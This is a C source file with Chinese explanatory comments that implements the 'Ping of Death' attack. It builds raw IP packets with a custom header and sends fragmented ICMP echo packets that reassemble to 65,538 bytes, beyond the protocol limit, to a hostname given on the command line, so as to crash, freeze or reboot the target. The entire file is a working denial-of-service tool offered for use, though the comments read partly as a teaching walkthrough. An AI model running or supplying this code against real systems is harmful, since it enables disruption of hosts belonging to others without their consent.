#define LINUX
#ifdef LINUX
#define REALLY_RAW
#define __BSD_SOURCE
#ifndef IP_MF
#define IP_MF           0x2000
#define IP_DF           0x4000
#define IP_CE           0x8000
#define IP_OFFSET       0x1FFF
#endif
#endif

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include<stdlib.h>
#include <arpa/inet.h>

/*
 * If your kernel doesn't muck with raw packets, #define REALLY_RAW.
 * This is probably only Linux.
 */
#ifdef REALLY_RAW
#define FIX(x)  htons(x)
#else
#define FIX(x)  (x)
#endif
/*
	原理就是发送一个大于IP协议规定的数据包大小（65535）的ip数据包给对方，
	发送的包一般用icmp_echo报文（也就是ping），因为当ip包过大，传输过程中会被分片，
	然后接收方收到所有片的分组后悔进行重组，这样对于大于规定大小的包重组后就是一个无效的包，
	接收方可能不懂如何处理，可能导致系统故障，如服务器重启、冻结等。
	程序的做法很简单，就是构造一个icmp_echo的ip包，然后包大小大于65535（如程序是采用65538的大小），
	这样发送给目标主机。
*/

int
main(int argc, char **argv)
{
        int s;
        char buf[1500]; //包内存分配
        struct ip *ip = (struct ip *)buf;  //ip结构
		//下面根据是否是linux系统来声明jcmp包
		#ifdef LINUX
        struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
		#else
        struct icmp *icmp = (struct icmp *)(ip + 1);
		#endif
		// 主机结构体
        struct hostent *hp;
		// socket结构体
        struct sockaddr_in dst;
        int offset;
        int on = 1;
		// 先清0
        bzero(buf, sizeof buf);

		//新建一个原始socket raw socket
		//原始套接字可以访问ICMP和ICMP等协议包，可以读写内核不处理的IP数据包。可以创建自定义的IP数据包首部。一句话，使用原始套接字可以编写基于IP协议的通讯程序。
        if ((s = socket(AF_INET, SOCK_RAW,
		#ifdef LINUX
        IPPROTO_ICMP
		#else
        IPPROTO_IP
		#endif
        )) < 0) {
                perror("socket");
                exit(1);
        }
		// 设置套接字的选项 IP_HDRINCL  这样可以自己定义IP首部
        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
                perror("IP_HDRINCL");
                exit(1);
        }
		// 判断输入参数是否正确
        if (argc != 2) {
                fprintf(stderr, "usage: %s hostname\n", argv[0]);
                exit(1);
        }
		//查看目的主机ip是否正确
        if ((hp = gethostbyname(argv[1])) == NULL) {
                if ((ip->ip_dst.s_addr = inet_addr(argv[1])) == -1) {
                        fprintf(stderr, "%s: unknown host\n", argv[1]);
                        exit(1);
                }
        } else {
                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);
        }
		// 提示开始发送
        printf("Sending to %s\n", inet_ntoa(ip->ip_dst));
		
        ip->ip_v = 4;   // ipv4
        ip->ip_hl = sizeof *ip >> 2; // ip头部大小
        ip->ip_tos = 0;  //服务选项不用
        ip->ip_len = FIX(sizeof buf);　// ip包总长度
        ip->ip_id = htons(4321);     // 数据包标识
        ip->ip_off = FIX(0);    // 包偏移  
        ip->ip_ttl = 255;	// 生命周期
        ip->ip_p = 1;	  // 协议
#ifdef LINUX    
        ip->ip_sum = 0;                 /* ip校验和 */
#else
        ip->ip_sum = 0;                 /* ip校验和 */
#endif
        ip->ip_src.s_addr = 0;          /*  */

        dst.sin_addr = ip->ip_dst;	// 初始化目的地址
        dst.sin_family = AF_INET;    //初始化协议家族 TCP/IP

		
		//icmp  类型初始化
#ifdef LINUX
        icmp->type = ICMP_ECHO;  //ICMP_ECHO就是ping
        icmp->code = 0;
        icmp->checksum = htons(~(ICMP_ECHO << 8));
                /* the checksum of all 0's is easy to compute */
#else
        icmp->icmp_type = ICMP_ECHO;
        icmp->icmp_code = 0;
        icmp->icmp_cksum = htons(~(ICMP_ECHO << 8));
                /* the checksum of all 0's is easy to compute */
#endif
		
		// 开始ping  这里是这样 分片进行ping  一共是65536 次
        for (offset = 0; offset < 65536; offset += (sizeof buf - sizeof *ip)) {
                ip->ip_off = FIX(offset >> 3);
				printf("sending..%d\n",offset);
                if (offset < 65120)
                        ip->ip_off |= FIX(IP_MF);
                else
                        ip->ip_len = FIX(418);  /* 这样包大小就是65120+418=65538 这样单个包的长度超过了IP协议规范所规定的包长度 */
                if (sendto(s, buf, sizeof buf, 0, (struct sockaddr *)&dst,sizeof dst) < 0) {
                        fprintf(stderr, "offset %d: ", offset);
                        perror("sendto");
                }
                if (offset == 0) {
#ifdef LINUX
                        icmp->type = 0;
                        icmp->code = 0;
                        icmp->checksum = 0;
#else
                        icmp->icmp_type = 0;
                        icmp->icmp_code = 0;
                        icmp->icmp_cksum = 0;
#endif
                }
        }
        return 0;
}
